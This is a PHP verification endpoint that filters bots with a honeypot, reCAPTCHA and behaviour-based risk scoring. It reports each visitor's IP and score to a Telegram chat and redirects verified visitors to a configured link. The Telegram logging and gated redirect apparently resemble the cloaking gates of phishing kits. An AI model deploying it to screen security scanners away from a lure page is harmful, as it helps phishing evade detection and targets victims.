<?php
session_start();
header('Content-Type: application/json');
include 'YOUR-CONFIG.php';

$response = array('success' => false, 'message' => '');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    $response['message'] = 'Invalid request method';
    echo json_encode($response);
    exit;
}

// Check for honeypot
if (isset($_POST['website']) && !empty($_POST['website'])) {
    $response['message'] = 'Bot detected';
    echo json_encode($response);
    exit;
}

// Verify reCAPTCHA
if (!isset($_POST['g-recaptcha-response'])) {
    $response['message'] = 'CAPTCHA required';
    echo json_encode($response);
    exit;
}

if (!verifyRecaptcha($_POST['g-recaptcha-response'], $recaptcha_secret)) {
    $response['message'] = 'CAPTCHA verification failed';
    echo json_encode($response);
    exit;
}

// Update behavior tracking
if (isset($_POST['js_check']) && $_POST['js_check'] == '1') {
    $_SESSION['js_enabled'] = true;
}
if (isset($_POST['mouse_moved']) && $_POST['mouse_moved'] == '1') {
    $_SESSION['mouse_moved'] = true;
}

// Calculate final score
$score = calculateRiskScore();

if ($score >= intval($max_fraud_score)) {
    $response['message'] = 'Suspicious activity detected';

    // Log to Telegram
    $msg = "🚫 <b>API: Bot Blocked</b>
IP: " . getRealIpAddr() . "
Score: " . $score . "/" . $max_fraud_score;
    sendTelegram($msg, $token_forVISITOR, $token_chatid_VISITOR);
} else {
    $_SESSION['verified'] = true;
    $response['success'] = true;
    $response['message'] = 'Verification successful';
    $response['redirect'] = $link;

    // Log to Telegram
    $msg = "✅ <b>API: Human Verified</b>
IP: " . getRealIpAddr() . "
Score: " . $score . "/" . $max_fraud_score;
    sendTelegram($msg, $token_forVISITOR, $token_chatid_VISITOR);
}

echo json_encode($response);
?>
